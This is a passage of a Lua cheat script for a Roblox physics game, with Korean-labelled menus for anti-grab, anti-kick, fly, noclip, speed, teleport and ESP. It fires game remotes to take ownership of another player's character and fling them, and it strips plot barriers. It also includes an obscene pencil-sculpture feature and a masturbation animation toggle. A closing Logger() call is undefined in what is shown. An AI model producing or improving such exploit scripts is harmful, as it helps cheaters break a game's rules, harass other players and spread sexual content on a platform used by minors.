    Callback = function(enabled)
        if enabled then
            autoStruggleCoroutine = RunService.Heartbeat:Connect(function()
                local character = localPlayer.Character
                if character and character:FindFirstChild("Head") then
                    local head = character.Head
                    local partOwner = head:FindFirstChild("PartOwner")
                    if partOwner then
                        Struggle:FireServer()
                        if game:GetService("ReplicatedStorage"):FindFirstChild("GameCorrectionEvents") and game:GetService("ReplicatedStorage").GameCorrectionEvents:FindFirstChild("StopAllVelocity") then
                            game:GetService("ReplicatedStorage").GameCorrectionEvents.StopAllVelocity:FireServer()
                        end
                        for _, part in pairs(character:GetChildren()) do
                            if part:IsA("BasePart") then
                                part.Anchored = true
                            end
                        end
                        if localPlayer:FindFirstChild("IsHeld") and localPlayer.IsHeld:IsA("ValueObject") then
                            while localPlayer.IsHeld.Value do
                                task.wait()
                            end
                        end
                        for _, part in pairs(character:GetChildren()) do
                            if part:IsA("BasePart") then
                                part.Anchored = false
                            end
                        end
                    end
                end
            end)
        else
            if autoStruggleCoroutine then
                autoStruggleCoroutine:Disconnect()
                autoStruggleCoroutine = nil
            end
        end
    end
})

blobmanInstanceS = nil
task.spawn(function()
    task.wait(0.5)
    if AntiGrabToggle and AntiGrabToggle.Set then
        AntiGrabToggle:Set(true)
    end
end)





antiTab:CreateToggle({
    Name = "안티킥 <font color='rgb(0,255,0)'>[그랩]</font>",
    CurrentValue = false,
    Flag = "AntiKickGrab", 
    Callback = function(enabled)
        if enabled then
            local character = localPlayer.Character

            antiKickCoroutine = RunService.Heartbeat:Connect(function()
                local character = localPlayer.Character
                if character and character:FindFirstChild("HumanoidRootPart") and character:FindFirstChild("HumanoidRootPart"):FindFirstChild("FirePlayerPart") then
                    local partOwner = character:FindFirstChild("HumanoidRootPart"):FindFirstChild("FirePlayerPart"):FindFirstChild("PartOwner")
                    if partOwner and partOwner.Value ~= localPlayer.Name then
                        local args = {[1] = character:WaitForChild("HumanoidRootPart"), [2] = 0}
                        game:GetService("ReplicatedStorage"):WaitForChild("CharacterEvents"):WaitForChild("RagdollRemote"):FireServer(unpack(args))
                        print("grabbity shap!")
                        wait(0.1)
                        Struggle:FireServer()
                    end
                end
            end)
        else
            if antiKickCoroutine then
                antiKickCoroutine:Disconnect()
                antiKickCoroutine = nil
            end
        end
    end
})


local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local characterConnections = {}
local activeCharacters = setmetatable({}, { __mode = "k" })

local MAX_VELOCITY_THRESHOLD = 150
local MAX_ROT_VELOCITY_THRESHOLD = 150
_G.AntiFlingEnabled = false

local function cleanupCharacterConnections(userId)
    if characterConnections[userId] then
        for connection in pairs(characterConnections[userId]) do
            if connection then connection:Disconnect() end
        end
        characterConnections[userId] = nil
    end
    activeCharacters[userId] = nil
end

local function monitorCharacter(character)
    if not _G.AntiFlingEnabled then return end
    
    local userId = LocalPlayer.UserId
    cleanupCharacterConnections(userId)
    
    local rootPart = character:WaitForChild("HumanoidRootPart", 5)
    local humanoid = character:WaitForChild("Humanoid", 5)
    if not rootPart or not humanoid then return end

    characterConnections[userId] = {}
    local registry = characterConnections[userId]

    local charData = {
        RootPart = rootPart,
        Humanoid = humanoid,
        LastSafeCFrame = rootPart.CFrame,
        Parts = {}
    }
    activeCharacters[userId] = charData

    local function refreshParts()
        table.clear(charData.Parts)
        for _, descendant in ipairs(character:GetDescendants()) do
            if descendant:IsA("BasePart") and not descendant.Anchored then
                table.insert(charData.Parts, descendant)
            end
        end
    end

    local addedConnection = character.DescendantAdded:Connect(function(descendant)
        if descendant:IsA("BasePart") then
            refreshParts()
        end
    end)
    registry[addedConnection] = true

    refreshParts()

    local mainPhysicsConnection
    mainPhysicsConnection = RunService.Heartbeat:Connect(function()
        if not _G.AntiFlingEnabled then
            cleanupCharacterConnections(userId)
            return
        end

        if not character or not character.Parent or humanoid.Health <= 0 then
            cleanupCharacterConnections(userId)
            return
        end

        local anomalyDetected = false

        for _, part in ipairs(charData.Parts) do
            if part and part.Parent then
                local velocity = part.AssemblyLinearVelocity.Magnitude
                local rotVelocity = part.AssemblyAngularVelocity.Magnitude

                if velocity > MAX_VELOCITY_THRESHOLD or rotVelocity > MAX_ROT_VELOCITY_THRESHOLD then
                    anomalyDetected = true
                    part.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                    part.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                end
            end
        end

        if anomalyDetected then
            if charData.LastSafeCFrame then
                rootPart.CFrame = charData.LastSafeCFrame
            end
        else
            charData.LastSafeCFrame = rootPart.CFrame
        end
    end)
    registry[mainPhysicsConnection] = true

    local removingConnection
    removingConnection = character.AncestryChanged:Connect(function(_, parent)
        if not parent then cleanupCharacterConnections(userId) end
    end)
    registry[removingConnection] = true
end

LocalPlayer.CharacterAdded:Connect(monitorCharacter)






antiTab:CreateSection("블롭")

if not AntiCheatStates then
    _G.AntiCheatStates = { blobConn = nil }
end

function SetAntiBlobman(enabled)
    local localPlayer = game.Players.LocalPlayer
    if not localPlayer then return end
    
    local function processPart(part)
        local invalid = part.Name == "LeftWeld" or part.Name == "RightWeld" or part.Name == "LeftAlignOrientation" or
                            part.Name == "RightAlignOrientation"

        if invalid and part.Parent and part.Parent.Parent and part.Parent.Parent.Parent ~=
            workspace:FindFirstChild(localPlayer.Name) then
            part.Enabled = not enabled
        end
    end
    for _, part in pairs(workspace:GetDescendants()) do
        processPart(part)
    end
    if enabled then
        if _G.AntiCheatStates.blobConn then
            _G.AntiCheatStates.blobConn:Disconnect()
        end
        _G.AntiCheatStates.blobConn = workspace.DescendantAdded:Connect(function(part)
            processPart(part)
        end)
    elseif _G.AntiCheatStates.blobConn then
        _G.AntiCheatStates.blobConn:Disconnect()
        _G.AntiCheatStates.blobConn = nil
    end
end

antiTab:CreateToggle({
    Name = "안티 블롭맨<font color='rgb(0,255,0)'>[오너쉽]</font>",
    Default = false,
    Callback = function(Value)
        SetAntiBlobman(Value)
    end
})
task.spawn(function()
    task.wait(0.5)
    if AntiBlobmanToggle and AntiBlobmanToggle.Set then
        AntiBlobmanToggle:Set(true)
    end
end)




antiTab:CreateSection("안티 에어 서스펜션")
antiTab:CreateToggle({
    Name = "디펜스 / 에어 서브펜션",
    CurrentValue = false,
    Flag = "SelfDefenseAirSuspend", 
    Callback = function(enabled)
        if enabled then
            autoDefendCoroutine = coroutine.create(function()
                while wait(0.02) do
                    local character = localPlayer.Character
                    if character and character:FindFirstChild("Head") then
                        local head = character.Head
                        local partOwner = head:FindFirstChild("PartOwner")
                        if partOwner then
                            local attacker = Players:FindFirstChild(partOwner.Value)
                            if attacker and attacker.Character then
                                Struggle:FireServer()
                                SetNetworkOwner:FireServer(attacker.Character.Head or attacker.Character.Torso, attacker.Character.HumanoidRootPart.FirePlayerPart.CFrame)
                                task.wait(0.1)
                                local target = attacker.Character:FindFirstChild("Torso")
                                if target then
                                    local velocity = target:FindFirstChild("l") or Instance.new("BodyVelocity")
                                    velocity.Name = "l"
                                    velocity.Parent = target
                                    velocity.Velocity = Vector3.new(0, 50, 0)
                                    velocity.MaxForce = Vector3.new(0, math.huge, 0)
                                    Debris:AddItem(velocity, 100)
                                end
                            end
                        end
                    end
                end
            end)
            coroutine.resume(autoDefendCoroutine)
        else
            if autoDefendCoroutine then
                coroutine.close(autoDefendCoroutine)
                autoDefendCoroutine = nil
            end
        end
    end
})

antiTab:CreateSection("")


local AntiInPlots = antiTab:CreateToggle({
    Name = "안티 인플레이스",
    CurrentValue = true,
    Callback = function(Value)
    antiInPlotsEnabled = Value
         if Value then
            task.spawn(antiInPlotsLoop)
        end
    end
})
AntiInPlots:Set(true)


local AntiVoid = antiTab:CreateToggle({
    Name = "안티 보이드",
    CurrentValue = false,
    Callback = function(Value)
        if Value then
            workspace.FallenPartsDestroyHeight = -50000
        else
            workspace.FallenPartsDestroyHeight = -100
        end
    end,
})
AntiVoid:Set(true)



function setupAntiExplosion(character)
    if not character then return end
    local humanoid = character:WaitForChild("Humanoid", 5)
    if humanoid then
        local partOwner = humanoid:FindFirstChild("Ragdolled")
        if partOwner then
            if antiExplosionConnection then antiExplosionConnection:Disconnect() end
            antiExplosionConnection = partOwner:GetPropertyChangedSignal("Value"):Connect(function()
                if partOwner.Value then
                    for _, part in ipairs(character:GetChildren()) do
                        if part:IsA("BasePart") then
                            part.Anchored = true
                        end
                    end
                else
                    for _, part in ipairs(character:GetChildren()) do
                        if part:IsA("BasePart") then
                            part.Anchored = false
                        end
                    end
                end
            end)
        end
    end
end

antiTab:CreateToggle({
    Name = "안티 폭발V2  <font color='rgb(0,0,255)'>[프리미엄]</font>",
    Default = false,
    Save = false,
    Flag = "AntiExplosion",
    Callback = function(enabled)
        local localPlayer = game.Players.LocalPlayer
        if not localPlayer then return end

        if enabled then
            if localPlayer.Character then
                setupAntiExplosion(localPlayer.Character)
            end
            if characterAddedConn then characterAddedConn:Disconnect() end
            characterAddedConn = localPlayer.CharacterAdded:Connect(function(character)
                setupAntiExplosion(character)
            end)
        else
            if antiExplosionConnection then
                antiExplosionConnection:Disconnect()
                antiExplosionConnection = nil
            end
            if characterAddedConn then
                characterAddedConn:Disconnect()
                characterAddedConn = nil
            end
        end
    end
})
task.spawn(function()
    task.wait(0.5)
    if AntiExplosionToggle and AntiExplosionToggle.Set then
        AntiExplosionToggle:Set(true)
    end
end)






AntiLagF()
local AntiLag = antiTab:CreateToggle({
    Name = "안티 렉",
    CurrentValue = false,
    Flag = "AntiLagToggle",
    Callback = function(Value)
        antiLagEnabled = Value
    end
})
AntiLag:Set(true)

antiTab:CreateToggle({
    Name = "안티렉V3[파카]",
    CurrentValue = false,
    Callback = function(Value)
        if Value then
            Rayfield:Notify({
                Title = "안내",
                Content = "이 기능은 파카전용기능입니다",
                Duration = 3,
                Image = nil,
            })
        end
    end,
})
local AutoAttack = antiTab:CreateToggle({
    Name = "오토어택 | 킬",
    CurrentValue = false,
    Flag = "AutoAttack",
    Callback = function(Value)
        AutoAttackT = Value
        AutoAttackF()
    end
})


antiTab:CreateSection("킥")



local AntiKick = antiTab:CreateToggle({
    Name = "안티 킥 <font color='rgb(255,146,132)'>[표창]</font>",
    CurrentValue = false,
    Callback = function(Value)
        AntiKickT = Value
        task.spawn(AntiKickF)
    end
})
AntiKick:Set(true)

antiTab:CreateSection("래그돌")
local PermRag = antiTab:CreateToggle({
    Name = "래그돌",
    CurrentValue = false,
    Flag = "34",
    Callback = function(Value)
        permRagdollT = Value
        if permRagdollT and not permRagdollRunningS then
            coroutine.wrap(permRagdollLoopF)()
        elseif not permRagdollT then
            permRagdollRunningS = false
        end
    end
})






playerTab:CreateSection("플레이어")
playerTab:CreateToggle({
    Name = "이동 속도   <font color='rgb(1,1,255)'>[스피드]</font>",
    CurrentValue = false,
    Flag = "28",
    Callback = function(Value)
        walkSpeedT = Value 
        updateWalkSpeedF()
    end
})

local walkSpeedInput = playerTab:CreateInput({
    Name = "값",
    CurrentValue = 16,
    PlaceholderText = "Value",
    RemoveTextAfterFocusLost = true,
    Flag = "29",
    Callback = function(Value)
        walkSpeedV = Value
        updateWalkSpeedF()
    end
})
walkSpeedInput:Set(80)





playerTab:CreateToggle({
    Name = "점프 높이   <font color='rgb(0,25,0)'>[굳]</font>",
    CurrentValue = false,
    Flag = "30",
    Callback = function(Value)
        jumpPowerT = Value
        updateJumpPowerF()
    end
})

local jumpPowerInput = playerTab:CreateInput({
    Name = "값",
    CurrentValue = 24,
    PlaceholderText = "Value",
    RemoveTextAfterFocusLost = false,
    Flag = "31",
    Callback = function(Value)
        jumpPowerV = Value
        updateJumpPowerF()
    end
})
jumpPowerInput:Set(60)

local realisticFP = false
local fpConnection = nil

local function updateFirstPerson()
    local char = plr.Character
    if not char then return end

    for _, part in pairs(char:GetChildren()) do
        if part:IsA("BasePart") then
            if part.Name == "Head" then
                part.LocalTransparencyModifier = 1          
            elseif part.Name:find("Arm") or part.Name:find("Hand") then
                part.LocalTransparencyModifier = 0          
            elseif part.Name:find("Torso") or part.Name == "UpperTorso" or part.Name == "LowerTorso" then
                part.LocalTransparencyModifier = 1        
            else
                part.LocalTransparencyModifier = 0
            end
        end
    end
end

local function startRealisticFP()
    if fpConnection then fpConnection:Disconnect() end
    fpConnection = RunService.RenderStepped:Connect(updateFirstPerson)
end

local function stopRealisticFP()
    if fpConnection then 
        fpConnection:Disconnect() 
        fpConnection = nil 
    end
    
    local char = plr.Character
    if char then
        for _, part in pairs(char:GetChildren()) do
            if part:IsA("BasePart") then
                part.LocalTransparencyModifier = 0
            end
        end
    end
end
playerTab:CreateToggle({
    Name = "1인칭 리얼뷰",
    CurrentValue = false,
    Callback = function(Value)
        realisticFP = Value
        if Value then
            startRealisticFP()
        else
            stopRealisticFP()
        end
    end
})
playerTab:CreateSection("나머지")
local NoClipToggle = playerTab:CreateToggle({
    Name = "노클립",
    CurrentValue = false,
    Flag = "32",
    Callback = function(Value)
        noClipT = Value
        updateNoClipF()
    end
})

playerTab:CreateToggle({
    Name = "무한 점프",
    CurrentValue = false,
    Callback = function(v)
        _G.InfiniteJump = v
    end
})

game:GetService("UserInputService").JumpRequest:Connect(function()
    if _G.InfiniteJump then
        game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
    end
end)
local Fly = playerTab:CreateToggle({ 
    Name = "플라이   <font color='rgb(255,0,0)'>[데스크톱]</font>", 
    CurrentValue = false,
    Flag = "5",
    Callback = function(Value)
        flyT = Value
        flyF()
    end
})

local flyInput = playerTab:CreateInput({
    Name = "속도",
    CurrentValue = 50,
    PlaceholderText = "Value",
    RemoveTextAfterFocusLost = false,
    Flag = "37",
    Callback = function(Value)
        flyV = Value
    end
})
flyInput:Set(80)


playerTab:CreateSection("엑스트라")

-- 1. Server Hop
playerTab:CreateButton({
    Name = "서버 훅",
    Callback = function()
        game:GetService("TeleportService"):Teleport(game.PlaceId, plr)
    end
})

-- 2. Rejoin
playerTab:CreateButton({
    Name = "제접ㅋ",
    Callback = function()
        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
    end
})

-- 3. FPS Unlock
playerTab:CreateButton({
    Name = "FPS 최대치",
    Callback = function()
        setfpscap(9999)
    end
})

-- 4. Full Bright
playerTab:CreateToggle({
    Name = "어둠 씨발 꺼져!!!!!",
    CurrentValue = false,
    Callback = function(Value)
        if Value then
            game:GetService("Lighting").Brightness = 2
            game:GetService("Lighting").ClockTime = 14
            game:GetService("Lighting").FogEnd = 100000
            game:GetService("Lighting").GlobalShadows = false
        else
            game:GetService("Lighting").Brightness = 1
            game:GetService("Lighting").GlobalShadows = true
        end
    end
})
playerTab:CreateSection("쓰잘때기없는 기능")

-- 1. 
playerTab:CreateToggle({
    Name = "FOV 변경",
    CurrentValue = false,
    Callback = function(Value)
        if Value then
            workspace.CurrentCamera.FieldOfView = 120
        else
            workspace.CurrentCamera.FieldOfView = 70
        end
    end
})

-- 2. 
playerTab:CreateButton({
    Name = "모든 장신구 제거",
    Callback = function()
        pcall(function()
            for _, item in pairs(plr.Character:GetChildren()) do
                if item:IsA("Accessory") or item.Name:find("Hat") or item.Name:find("Hair") then
                    item:Destroy()
                end
            end
        end)
    end
})

-- 3. 
playerTab:CreateToggle({
    Name = "중력 변경",
    CurrentValue = false,
    Callback = function(Value)
        if Value then
            workspace.Gravity = 50
        else
            workspace.Gravity = 196.2
        end
    end
})

AuraTab:CreateSection("안티 아우라들")
AuraTab:CreateToggle({
    Name = "안티 붐박스 아우라   <font color='rgb(0,200,0)'>[all]</font>",
    CurrentValue = false,
    Flag = "5",
    Callback = function(Value)
        AntiBoxT = Value
        AntiBoxF()
    end
})





AuraTab:CreateToggle({
	Name = "주크박스 고정 아우라",
	CurrentValue = false,
	Flag = "AntiJukeboxAura",
	Callback = function(Value)
		_G.AntiJukeboxT = Value
		if Value then
			AntiJukeboxF()
		end
	end
})
AuraTab:CreateToggle({
	Name = "판자 고정 아우라",
	CurrentValue = false,
	Flag = "AntiPalletAura",
	Callback = function(Value)
		_G.AntiPalletT = Value
		if Value then
			AntiPalletF()
		end
	end
})





 funTab:CreateButton({
   Name = "텔포",
   Callback = function()
      if not Value then return end
      local hrp = plr.Character:WaitForChild("HumanoidRootPart")
      local pos = hrp.Position
      hrp.CFrame = CFrame.new(pos.X, Value, pos.Z)
   end,
})

funTab:CreateSection("이동할곳")
local teleportLocations = {
    ["스폰"] = {0, -7, 0},
    ["스폰산"] = {494, 163, 175},
    ["설산"] = {-394, 230, 509},
    ["헛간(농지)"] = {-156, 59, -291},
    ["위험구역"] = {125, -7, 241},
    ["하늘섬"] = {63, 346, 309},
    ["큰동굴"] = {-240, 29, 554},
    ["작은동굴"] = {-84, 14, -310},
    ["열차동굴"] = {602, 45, -175},
    ["광산"] = {-308, -7, 506},
    ["초록집"] = {-352, 98, 353},
    ["(초록집)"] = {-532, -7, 92},
    ["(분홍집)"] = {-484, -7, -165},
    ["(보라집)"] = {249, -7, 461},
    ["(파랑집)"] = {513, 83, -341},
    ["(빨강집)"] = {551, 123, -73},
    ["슬롯1"] = {51, 11, -118},
    ["슬롯2"] = {-543, 11, -40},
    ["슬롯3"] = {169, 11, 530},
    ["슬롯4"] = {-214, 102, 423},
    ["슬롯5"] = {563, 102, -218},
    ["독우물 아래"] = {121, -56, 251},
}

local selectedLocation = "스폰"

local Dropdown = plotTab:CreateDropdown({
    Name = "위치 고르기",
    Options = {"스폰","스폰산","광산","큰동굴","작은동굴","열차동굴","위험구역","설산","헛간(농지)","하늘섬","초록집","(초록집)","(분홍집)","(보라집)","(파랑집)","(빨강집)","슬롯1","슬롯2","슬롯3","슬롯4","슬롯5","독우물 아래"},
    CurrentOption = "스폰",
    MultipleOptions = false,
    Callback = function(Value)
        if typeof(Value) == "table" then
            selectedLocation = Value[1] or "스폰"
        else
            selectedLocation = Value
        end
    end,
})

local Button = plotTab:CreateButton({
    Name = "텔포",
    Callback = function()
        local plr = game.Players.LocalPlayer
        local char = plr.Character or plr.CharacterAdded:Wait()
        local hrp = char:WaitForChild("HumanoidRootPart")

        local pos = teleportLocations[selectedLocation]
        if not pos then
            return
        end

        hrp.CFrame = CFrame.new(pos[1], pos[2], pos[3])
    end,
})


funTab:CreateSection("꼬추 만들기")
local Inputt = funTab:CreateInput({
   Name = "연필    <font color='rgb(200,0,255)'>[dick]</font>",
   CurrentValue = "",
   PlaceholderText = "Value",
   RemoveTextAfterFocusLost = false,
   Flag = "Input1",
   Callback = function(Text)
   end
})

local Ctratee = funTab:CreateButton({
   Name = "만들기",
   Callback = function()
       local ReplicatedStorage = game:GetService("ReplicatedStorage")
       local pencilCountText = Inputt.CurrentValue
       local TNUM = tonumber(pencilCountText)

       if not TNUM or TNUM <= 0 then
           warn("Please enter a valid number!")
           Rayfield:Notify({Title = "[ ✏️ ]", Content = "Nil Value", Duration = 3, Image = 0})
           return
       end

       local character = plr.Character or plr.CharacterAdded:Wait()
       local hrp = character:WaitForChild("HumanoidRootPart")
       local inv = workspace:WaitForChild(plr.Name .. "SpawnedInToys")
       local StickyPartEvent = ReplicatedStorage:WaitForChild("PlayerEvents"):WaitForChild("StickyPartEvent")
       local SpawnToy = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")


function GetPlotNumber()
    local char = plr.Character
    if not char then return nil end

    if char.Parent == workspace then 
        return nil
    elseif char.Parent.Name == "PlayersInPlots" then
        for _, plot in workspace.Plots:GetChildren() do
            for _, owner in plot.PlotSign.ThisPlotsOwners:GetChildren() do
                if owner.Value == plr.Name then
                    if plot.Name == "Plot1" then
                        return 1
                    elseif plot.Name == "Plot2" then
                        return 2
                    elseif plot.Name == "Plot3" then
                        return 3
                    elseif plot.Name == "Plot4" then
                        return 4
                    elseif plot.Name == "Plot5" then
                        return 5
                    end
                end
            end
        end
    end
    return nil
end

function GetInventory()
    local plotNumber = GetPlotNumber()

    if plotNumber then
        local plotItems = workspace:FindFirstChild("PlotItems")
        if plotItems then
            local plotFolder = plotItems:FindFirstChild("Plot" .. plotNumber)
            if plotFolder then
                return plotFolder
            end
        end
    end
    return workspace:WaitForChild(plr.Name .. "SpawnedInToys")
end

local inv = GetInventory()

function createPencil(index)
    while not plr.CanSpawnToy.Value do task.wait() end

    task.spawn(function()
        SpawnToy:InvokeServer("ToolPencil", hrp.CFrame * CFrame.new(0,5,15), Vector3.new(0,0,0))
    end)

    task.wait(0.3)

    inv = GetInventory()

    local pencil
    local children = inv:GetChildren()
    for i = #children, 1, -1 do
        if children[i].Name == "ToolPencil" then
            pencil = children[i]
            break
        end
    end

    if not pencil then 
        print("Pencil not found in inventory")
        return nil 
    end

    local stickyPart = pencil:WaitForChild("StickyPart")
    local SoundPart = pencil:WaitForChild("SoundPart")

    if stickyPart and SoundPart then
        ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(SoundPart, SoundPart.CFrame)
        ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(SoundPart, character.Torso.CFrame)
    end

    local PartOwner = SoundPart:WaitForChild("PartOwner")
    if PartOwner then
        SoundPart.CFrame = CFrame.new(0, 599999, 999)
    end

    stickyPart.Name = "w" .. index

    for _, part in pairs(pencil:GetDescendants()) do
        if part:IsA("BasePart") and part.Color == Color3.fromRGB(158, 108, 141) then
            part.Name = "a" .. index
        end
    end

    return pencil
end

local pencils = {}

for i = 1, TNUM do
    local pencil = createPencil(i)
    if pencil then
        table.insert(pencils, pencil)
    end
    task.wait(0.1)
end

for i = 1, #pencils - 1 do
    local currentPencil = pencils[i]
    local nextPencil = pencils[i + 1]

    if currentPencil and nextPencil then
        local attachFrom = currentPencil:FindFirstChild("w" .. i)
        local attachTo = nextPencil:FindFirstChild("a" .. (i + 1))

        if attachFrom and attachTo then
            StickyPartEvent:FireServer(attachFrom, attachTo, CFrame.Angles(0, math.rad(-90), 0))
        end
    end
    task.wait(0.05)
end

local torso2 = character:WaitForChild("HumanoidRootPart"):WaitForChild("RagdollTouchedHitbox")
local torso = character:FindFirstChild("Torso")
if torso2 and #pencils >= TNUM then
    local lastPencil = pencils[TNUM]
    if lastPencil then
        local wLast = lastPencil:FindFirstChild("w" .. TNUM)
        if wLast then
            local attachPosition = torso2.CFrame * CFrame.new(0, -1.1, 0.1) * CFrame.Angles(0, math.rad(180), 0) -- CFrame.new(0, -torso2.Size.Y/2 - -0.1, -0.5)
            local relativeCF = torso2.CFrame:ToObjectSpace(attachPosition)
            StickyPartEvent:FireServer(wLast, torso2, relativeCF)
        end
    end
end
   end
})






keybindTab:CreateSection("줄")
local antilagDet = keybindTab:CreateInput({
    Name = "줄 감지",
    CurrentValue = 30,
    PlaceholderText = "",
    RemoveTextAfterFocusLost = false,
    Flag = "linesInputFlag",
    Callback = function(Value)
        AntiLagV = Value
    end
})
antilagDet:Set(30)


game:GetService('Players').LocalPlayer.CharacterAdded:Connect(function()
    vu5 = nil
    vu6 = false
end)

keybindTab:CreateSection("Mouse")
keybindTab:CreateKeybind({
    Name = "텔포",
    CurrentKeybind = "Z",
    HoldToInteract = false,
    Flag = "38",
    Callback = tpF
})

local Tper = keybindTab:CreateToggle({
    Name = "3인칭",
    CurrentValue = false,
    Flag = "AutoSitBlobman",
    Callback = function(Value)
        _G.CameraLoopID = (_G.CameraLoopID or 0) + 1
        local currentLoopID = _G.CameraLoopID

        if Value then
            task.spawn(function()
                local character = plr.Character or plr.CharacterAdded:Wait()
                local rootPart = character:WaitForChild("HumanoidRootPart", 5)
                
                plr.CameraMode = Enum.CameraMode.Classic
                task.wait(0.05)
                
                local success = false
                local attempts = 0
                
                while _G.CameraLoopID == currentLoopID and not success and attempts < 80 do
                    plr.CameraMinZoomDistance = 12
                    plr.CameraMaxZoomDistance = 12
                    
                    task.wait(0.05)
                    attempts = attempts + 1
                    
                    if plr:GetAttribute("CameraZoomDistance") == 12 or 
                       (workspace.CurrentCamera and rootPart and (workspace.CurrentCamera.CoordinateFrame.p - rootPart.Position).Magnitude >= 11.5) then
                        success = true
                    end
                end
                
                if _G.CameraLoopID == currentLoopID then
                    plr.CameraMinZoomDistance = 0.5 
                    plr.CameraMaxZoomDistance = 100000 
                end
            end)
        else
            plr.CameraMode = Enum.CameraMode.LockFirstPerson
            plr.CameraMaxZoomDistance = 0.5
            plr.CameraMinZoomDistance = 0.5
        end
    end
})

task.spawn(function()
    if not game:IsLoaded() then game.Loaded:Wait() end
    task.wait(0.3)
    Tper:Set(true)
end)




keybindTab:CreateKeybind({
    Name = "앉기 <font color='rgb(255,0,0)'>[블롭맨]</font>",
    CurrentKeybind = "X",
    HoldToInteract = false,
    Flag = "40",
    Callback = function()
        BlobSit()
    end,
})

plotTab:CreateSection("집")
local BarrierNoclip = plotTab:CreateToggle({
    Name = "집 베리어 삭제",
    CurrentValue = false,
    Flag = "BarrierNoclipToggle",
    Callback = function(Value)
        BarrierCanCollideT = Value
        BarrierCanCollideF()
    end
})
BarrierNoclip:Set(true)



keybindTab:CreateSection("ESP")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")

local RunService = game:GetService("RunService")

local PcldViewT = false
local processed = {}
local redBoxes = {}
local descendantConn = nil


function PcldViewF()
    if descendantConn then
        descendantConn:Disconnect()
        descendantConn = nil
        workspace:SetAttribute("PcldViewDescendantConn", false)
    end
    if rainbowConn then
        rainbowConn:Disconnect()
        rainbowConn = nil
    end

    if PcldViewT then

        local function createESP(obj)
            if not processed[obj] then
                local box = Instance.new("SelectionBox")
                box.Adornee = obj
                box.LineThickness = 0.005
                box.SurfaceTransparency = 1
                box.SurfaceColor3 = Color3.fromRGB(255, 255, 255)
                box.Color3 = Color3.fromHSV(0, 1, 1) -- 초기 색상 (빨간색)
                box.Parent = obj
                processed[obj] = true
                redBoxes[obj] = box
            end
        end

        
        for _, obj in ipairs(workspace:GetChildren()) do
            if (obj.Name == "PlayerCharacterLocationDetector" or obj.Name == "me") and obj:IsA("BasePart") then
                createESP(obj)
            end
        end

    
        descendantConn = workspace.DescendantAdded:Connect(function(obj)
            if PcldViewT and (obj.Name == "PlayerCharacterLocationDetector" or obj.Name == "me") and obj:IsA("BasePart") then
                createESP(obj)
            end
        end)

        
        workspace.DescendantRemoving:Connect(function(obj)
            if redBoxes[obj] then
                redBoxes[obj]:Destroy()
                redBoxes[obj] = nil
                processed[obj] = nil
            end
        end)

        
        rainbowConn = RunService.RenderStepped:Connect(function()
            
            local hue = (tick() % 5) / 5 
            local rainbowColor = Color3.fromHSV(hue, 1, 1)

            for obj, box in pairs(redBoxes) do
                if box and box.Parent then
                    box.Color3 = rainbowColor
                else
                    redBoxes[obj] = nil
                    processed[obj] = nil
                end
            end
        end)

    else
                for obj, box in pairs(redBoxes) do
            if box then box:Destroy() end
        end
        redBoxes = {}
        processed = {}
    end
end




local PCLDView = keybindTab:CreateToggle({
    Name = "PCLD 보기",
    CurrentValue = false,
    Flag = "PCLDView",
    Callback = function(Value)
        PcldViewT = Value
        PcldViewF()
    end
})
PCLDView:Set(true)

local ViewTool = keybindTab:CreateToggle({
    Name = "표창,쿠나이 보기",
    CurrentValue = false,
    Flag = "5",
    Callback = function(Value)
        ViewToolT = Value
        ViewToolF()
    end
})
ViewTool:Set(true)




CreditsTab:CreateLabel("누나   <font color='rgb(255,0,0)'>[onwer]</font>", 96897864871400, Color3.fromRGB(255, 255, 255), true)
CreditsTab:CreateParagraph({Title = "0110rim", Content = "착함의 경지"})

CreditsTab:CreateLabel("식호   <font color='rgb(0,255,0)'>[good]</font>", 113854105043977, Color3.fromRGB(255, 255, 255), false)
CreditsTab:CreateParagraph({Title = "매우좋습니다.", Content = "가장좋은방"})

CreditsTab:CreateLabel("알파   <font color='rgb(0,255,255)'>[TOP1 ONWER]</font>", 3572491301, Color3.fromRGB(255, 255, 255), false)
CreditsTab:CreateParagraph({Title = "QRDOOTE1120", Content = "Owner"})

CreditsTab:CreateLabel("부계   <font color='rgb(255,0,0)'>[onwer]</font>", 78390276296494, Color3.fromRGB(255, 255, 255), false)
CreditsTab:CreateParagraph({Title = "AI_AIPACA", Content = "Co-Owner"})


-- ================== 랭크 알림 ==================
Rayfield:Notify({
    Title = "랭크 알림",
    Content = "랭크 배치완료",
    Duration = 6,
    Image = 0
})








 



DDTab:CreateToggle({
    Name = "딸치기   <font color='rgb(25,255,0)'>[자위마스터]</font>",
    CurrentValue = false,
    Flag = "JerkMotionToggle", 
    Callback = function(Value)
        jerkActive = Value

        local player = game:GetService("Players").LocalPlayer
        local character = player.Character
        if not character then return end
        
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not humanoid then return end

        local animator = humanoid:FindFirstChildOfClass("Animator")
        if not animator then
            animator = Instance.new("Animator")
            animator.Parent = humanoid
        end

        if jerkActive then
            if not jerkAnimationTrack then
                local animation = Instance.new("Animation")
                animation.AnimationId = "rbxassetid://168268306"
                jerkAnimationTrack = animator:LoadAnimation(animation)
            end

            jerkAnimationTrack:Play()
            task.wait(0.3)

            task.spawn(function()
                while jerkActive and jerkAnimationTrack and jerkAnimationTrack.IsPlaying do
                    jerkAnimationTrack.TimePosition = 0.3
                    task.wait(0.1)
                end
            end)
        else
            if jerkAnimationTrack then
                jerkAnimationTrack:Stop()
            end
        end
    end,
})

Logger()

 
